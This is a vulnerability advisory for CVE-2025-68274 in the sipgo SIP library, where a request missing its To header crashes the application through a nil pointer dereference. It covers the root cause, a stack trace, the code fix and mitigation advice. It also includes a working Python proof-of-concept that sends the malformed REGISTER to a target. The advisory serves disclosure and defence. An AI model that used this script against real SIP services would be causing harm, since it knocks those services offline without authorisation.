SIPGO: Response DoS vulnerability via nil pointer dereference (CVSS v4.0 Score: 8.7 / High)

- CVSS v4.0
    - Exploitability: High
    - Complexity: Low
    - Vulnerable system: High
    - Subsequent system: None
    - Exploitation: High
    - Security requirements: High
    - Vector: https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
- Other references:
    - CVE-2025-68274 (https://www.cve.org/CVERecord?id=CVE-2025-68274)
    - GHSA-c623-f998-8hhv (https://github.com/emiago/sipgo/security/advisories/GHSA-c623-f998-8hhv)
    - CWE-476: NULL Pointer Dereference
    - CWE-755: Improper Handling of Exceptional Conditions
- Fixed versions: >= v1.0.0-alpha-1 (https://github.com/emiago/sipgo/releases/tag/v1.0.0-alpha-1)
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2025-02-sipgo-response-dos
- Tested vulnerable versions: >= v0.3.0, < v1.0.0-alpha-1
- Timeline:
	- First discovery: 2025-08-31
	- Root cause analysis: 2025-08-31
	- Fix developed: 2025-08-31
	- Regression tests created: 2025-08-31
	- Enable Security advisory: 2025-09-03


DESCRIPTION

A nil pointer dereference vulnerability was discovered in the SIPGO library's NewResponseFromRequest function that affects all normal SIP operations. The vulnerability allows remote attackers to crash any SIP application by sending a single malformed SIP request without a To header.

The vulnerability occurs when SIP message parsing succeeds for a request missing the To header, but the response creation code assumes the To header exists without proper nil checks. This affects routine operations like call setup, authentication, and message handling - not just error cases.

Note: This vulnerability affects all SIP applications using the sipgo library, not just specific configurations or edge cases, as long as they make use of the NewResponseFromRequest function.

TECHNICAL DETAILS

The vulnerability is located in /sip/response.go at line 242 in the NewResponseFromRequest function:

if _, ok := res.To().Params["tag"]; !ok {
    uuid, _ := uuid.NewRandom()
    res.to.Params["tag"] = uuid.String()
}

Root Cause:

1. Missing To Header: When any SIP request is sent without a To header, the SIP message parsing succeeds but the To header is never set in the request object.

2. Header Copying Logic: During response creation in NewResponseFromRequest, the code attempts to copy headers from the request to the response. Since there's no To header in the request, no To header is copied to the response.

3. Unsafe Assumption: The response creation code assumes the To header exists and calls res.To().Params["tag"] without checking if res.To() returns nil, causing a nil pointer dereference.

Stack Trace:
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x2 addr=0x70 pc=0x10261fcb4]

goroutine 175 [running]:
github.com/emiago/sipgo/sip.NewResponseFromRequest(0x14000433e00, 0x191, {0x1026b074b, 0xb}, {0x0, 0x0, 0x0})
    /Users/user/Documents/GitHub/sipgo/sip/response.go:242 +0x394

IMPACT

This vulnerability affects all SIP applications using the sipgo library.

Attack Impact:
- Availability: Complete denial of service - application crashes immediately
- Remote Exploitation: Yes
- Authentication Required: No - vulnerability triggers during initial response generation which does not require authentication

HOW TO REPRODUCE THE ISSUE

To reproduce this issue, you need:

1. A SIP application using the vulnerable sipgo library
2. Network access to send SIP messages to the target

Steps:

1. Save the following Python script as sipgo-response-dos.py:

    #!/usr/bin/env python3
    import socket
    import sys
    import time
    import random

    def create_malformed_register(target_ip, target_port):
        call_id = f"sipgo-dos-{int(time.time())}"
        tag = f"sipgo-dos-{random.randint(1000, 9999)}"
        branch = f"z9hG4bK-sipgo-dos-{random.randint(10000, 99999)}"
        
        # Craft malformed SIP request without To header
        sip_message = (
            f"REGISTER sip:{target_ip}:{target_port} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP 192.168.1.100:5060;rport;branch={branch}\r\n"
            f"From: <sip:attacker@192.168.1.100>;tag={tag}\r\n"
            f"Call-ID: {call_id}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:attacker@192.168.1.100:5060>\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
        )
        return sip_message

    if __name__ == "__main__":
        if len(sys.argv) != 3:
            print("Usage: python3 sipgo-response-dos.py <target_ip> <target_port>")
            sys.exit(1)
        
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = create_malformed_register(target_ip, target_port)
        
        print(f"Sending malformed REGISTER to {target_ip}:{target_port}")
        sock.sendto(payload.encode('utf-8'), (target_ip, target_port))
        print("Exploit sent - target should crash immediately")

2. Set up a test server (optional):
   
   A vulnerable test server is provided in the vulnerable-example/ directory:
   
   cd vulnerable-example
   go mod tidy
   go run vulnerable-server.go -addr 127.0.0.1:5060

3. Run the script against a vulnerable sipgo application:

    python3 sipgo-response-dos.py <target_ip> <target_port>

4. Observe that the target application crashes with a SIGSEGV panic.

Note: The key element is the missing To header in any SIP request, which triggers the nil pointer dereference.

SOLUTIONS AND RECOMMENDATIONS

Fix Applied:
The vulnerability has been patched by adding a nil check before accessing the To header parameters:

// BEFORE (Vulnerable)
if _, ok := res.To().Params["tag"]; !ok {
    uuid, _ := uuid.NewRandom()
    res.to.Params["tag"] = uuid.String()
}

// AFTER (Fixed)
if to := res.To(); to != nil {
    if _, ok := to.Params["tag"]; !ok {
        uuid, _ := uuid.NewRandom()
        to.Params["tag"] = uuid.String()
    }
}

Immediate Actions:
1. Update to patched version of sipgo library
2. Implement input validation for required SIP headers at application layer
3. Add graceful error handling for malformed requests

Long-term Measures:
1. Extend continuous SIP protocol fuzzing
2. Add strict validation for all SIP headers
3. Add crash detection and alerting for SIP services

ABOUT ENABLE SECURITY

Enable Security (https://www.enablesecurity.com) provides quality penetration testing to help protect your real-time communications systems against attack.

DISCLAIMER

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

DISCLOSURE POLICY

This report is subject to Enable Security's vulnerability disclosure policy which can be found at https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy.